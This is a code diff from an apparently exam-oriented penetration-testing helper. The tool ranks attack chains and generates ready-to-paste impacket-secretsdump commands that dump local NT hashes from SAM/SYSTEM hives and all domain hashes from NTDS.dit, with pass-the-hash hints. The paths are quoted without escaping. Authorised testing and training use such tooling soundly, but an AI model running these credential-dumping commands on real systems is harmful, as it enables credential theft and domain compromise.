@@ -1102,13 +1102,21 @@ def run(report, store, ui=None):
     # iter-13: conf=1.0 was 'command will succeed', but conf encodes 'likelihood
     # of access'. SAM gives LOCAL hashes only - useful where the originating
     # host is reachable; useless against the DC without --local-auth.
+    # iter-74: emit real paths (os.path.join(d, hive_name)) instead of the
+    # bare 'SAM'/'SYSTEM'/'NTDS.dit' filenames the previous version used -
+    # the operator can now paste from wherever their CWD is instead of
+    # having to cd into the loot dir first.
     for d, hives in e.sam_dirs.items():
+        _sam = os.path.join(d, "SAM")
+        _sys = os.path.join(d, "SYSTEM")
+        _sec = os.path.join(d, "SECURITY")
+        _ntds = os.path.join(d, "NTDS.dit")
         if {"sam", "system"} <= hives:
             chains.append(Chain("R3T", "dump SAM", "SAM+SYSTEM -> local NT hashes (PtH against ORIGINATING host with --local-auth, NOT the DC)",
                 crit=7, conf=0.9, ready=1.5, prox=0.7,        # score 6.62
-                commands=["impacket-secretsdump -sam SAM -system SYSTEM" +
-                          (" -security SECURITY" if "security" in hives else "") + " LOCAL"],
-                src=os.path.join(d, "SAM")))
+                commands=[f"impacket-secretsdump -sam '{_sam}' -system '{_sys}'" +
+                          (f" -security '{_sec}'" if "security" in hives else "") + " LOCAL"],
+                src=_sam))
         # iter-21: NTDS.dit + SYSTEM = offline DCSync (R3D).
         # Highest-yield AD chain - dumps EVERY domain account NTLM hash
         # without touching the network, fully exam-legal.
@@ -1116,8 +1124,8 @@ def run(report, store, ui=None):
             chains.append(Chain("R3D", "offline DCSync",
                 "NTDS.dit + SYSTEM hive -> offline DCSync (ALL domain creds, no network)",
                 crit=10, conf=0.95, ready=1.5, prox=0.9,      # score 12.83 - tops the queue
-                commands=["impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL"],
-                src=os.path.join(d, "NTDS.dit")))
+                commands=[f"impacket-secretsdump -ntds '{_ntds}' -system '{_sys}' LOCAL"],
+                src=_ntds))
 
     # ── dedup identical chains across files (keep best score, sum counts) ──
     by_key = {}
